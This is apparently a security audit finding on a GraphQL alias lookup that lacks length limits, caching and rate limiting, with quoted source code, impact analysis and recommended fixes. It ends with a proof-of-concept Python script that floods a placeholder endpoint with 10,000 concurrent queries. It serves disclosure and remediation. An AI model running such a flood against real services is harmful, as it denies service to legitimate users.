### Title
Unbounded Unauthenticated Alias Lookups Exhaust DB Read Capacity via GraphQL `account` Query

### Summary
The GraphQL `account(input: AccountInput!)` query accepts an `alias` field validated only by character set (`^[A-Z2-7]+$`) with no length cap, no per-request rate limiting, and no result caching in the `graphql` module. Every alias query — including those for non-existent accounts — triggers a direct, uncached database read. An unprivileged attacker can flood the endpoint with unique valid-but-nonexistent aliases, exhausting DB read capacity without triggering any brute-force detection.

### Finding Description

**Schema validation — character set only, no length limit:**
`graphql/src/main/resources/graphql/account.graphqls`, line 90:
```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$")
```
No `@Size` or equivalent directive bounds the alias length. The Jackson JSON constraint (`maxStringLength(11000)`) in `GraphQlConfiguration.java` (line 79) is the only practical ceiling, allowing aliases up to ~11 000 characters per request.

**Controller passes alias directly to service with no further validation:**
`graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java`, lines 47–48:
```java
if (alias != null) {
    return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
}
```

**Service decodes and queries DB unconditionally:**
`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 29–31:
```java
public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
    return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
}
```

**Repository has no `@Cacheable` annotation — every call hits the DB:**
`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 13–14:
```java
@Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByAlias(byte[] alias);
```
Contrast with the `web3` module's `EntityRepository`, which uses `@Cacheable` on alias lookups.

**No rate limiting in the `graphql` module:**
`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 43–45:
```java
var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
```
The `ThrottleManagerImpl` / `ThrottleConfiguration` (bucket4j-based rate limiting) exists only in the `web3` module. The `graphql` module has no equivalent.

**Exploit flow:**
1. Attacker generates an unbounded stream of unique strings matching `^[A-Z2-7]+$` (e.g., random 50-character Base32 strings).
2. Each string is sent as `{ account(input: { alias: "<RANDOM>" }) { id } }` to `/graphql/alpha`.
3. Each request passes the `@Pattern` check, reaches `EntityServiceImpl.getByAliasAndType`, decodes the alias, and issues `SELECT * FROM entity WHERE alias = $1 AND deleted IS NOT TRUE` against the DB.
4. Because no account matches, the DB returns empty — but the I/O cost is paid on every request.
5. No cache absorbs repeated misses; no rate limiter throttles the request stream; no brute-force detector fires (queries are semantically valid, not repeated credentials).

### Impact Explanation
Each unique alias query causes a full index probe on the `entity` table. With no caching and no rate limiting, a sustained flood of such queries directly translates to proportional DB read IOPS consumption. At sufficient request rates (easily achievable from a single host or small botnet), legitimate mirror-node queries (REST, web3, other GraphQL) are starved of DB capacity, causing latency spikes and potential service unavailability. The impact is a resource-exhaustion DoS against the shared database backend.

### Likelihood Explanation
The endpoint is publicly accessible with no authentication. The attack requires only an HTTP client and a trivial Base32 string generator. The `@Pattern` validation is the only gate, and it is trivially satisfied. No special knowledge of the system is needed. The attack is fully automatable, repeatable, and distributable across multiple source IPs to evade any upstream network-layer rate limiting.

### Recommendation
1. **Add a length constraint on `alias`:** Apply `@Size(max: 100)` (or equivalent GraphQL directive) to the `alias` field in `AccountInput` to bound the decoded byte array size and reduce per-query cost.
2. **Add caching to `EntityRepository.findByAlias` in the `graphql` module:** Annotate with `@Cacheable` (as done in the `web3` module) so repeated misses for the same alias do not hit the DB.
3. **Implement request-rate limiting in the `graphql` module:** Port the bucket4j-based `ThrottleManagerImpl` pattern from the `web3` module, or add a `WebGraphQlInterceptor` that enforces per-IP or global request-per-second limits.
4. **Consider negative-result caching:** Cache `Optional.empty()` results for a short TTL to absorb miss floods without DB round-trips.

### Proof of Concept
```bash
# Generate and send 10 000 unique nonexistent alias queries
python3 -c "
import random, string, subprocess, threading

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

def send(i):
    alias = ''.join(random.choices(chars, k=50))
    subprocess.run([
        'curl', '-s', '-X', 'POST',
        'http://<GRAPHQL_HOST>/graphql/alpha',
        '-H', 'Content-Type: application/json',
        '-d', '{\"query\":\"{account(input:{alias:\\\"' + alias + '\\\"}){id}}\"}',
    ], capture_output=True)

threads = [threading.Thread(target=send, args=(i,)) for i in range(10000)]
for t in threads: t.start()
for t in threads: t.join()
"
```
Each thread issues a syntactically valid GraphQL query with a unique 50-character Base32 alias. All pass the `@Pattern` check, all reach the DB, none are cached, and none are throttled. Monitor DB IOPS and query latency to observe the resource impact.
